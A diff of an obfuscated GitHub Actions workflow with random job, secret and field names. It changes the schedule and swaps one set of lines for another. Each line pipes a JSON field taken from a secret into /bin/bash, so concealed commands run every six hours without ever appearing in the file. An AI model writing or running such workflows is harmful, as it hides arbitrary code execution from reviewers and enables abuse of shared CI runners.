@@ -1,26 +1,21 @@
 name: chengyihai2603
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '30 5/6 * * *'
+    - cron: '4 4/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: chengyihai2603
         env:
-          j44026: ${{ secrets.j44026 }}
+          bajm87200: ${{ secrets.bajm87200 }}
         run: |
-          echo $j44026 | jq -r .nuy80 | /bin/bash
-          echo $tojt98912 | jq -r .xg78649 | /bin/bash
-          echo $imnl597 | jq -r .qmxg9178 | /bin/bash
-          echo $jw14 | jq -r .kkc98 | /bin/bash
-          echo $qo84611 | jq -r .k61926 | /bin/bash
-          echo $yxv6760 | jq -r .j5262 | /bin/bash
-          echo $kirqq68262 | jq -r .vxy53 | /bin/bash
-          echo $h596 | jq -r .eyu2 | /bin/bash
-          echo $ldy4 | jq -r .ph3676 | /bin/bash
+          echo $bajm87200 | jq -r .oiah12 | /bin/bash
+          echo $hw54 | jq -r .hsxya80485 | /bin/bash
+          echo $vf54674 | jq -r .z54334 | /bin/bash
+          echo $xn8 | jq -r .prju1 | /bin/bash
+          echo $uul24 | jq -r .ogzec7 | /bin/bash
+          echo $r27 | jq -r .h7650 | /bin/bash
 
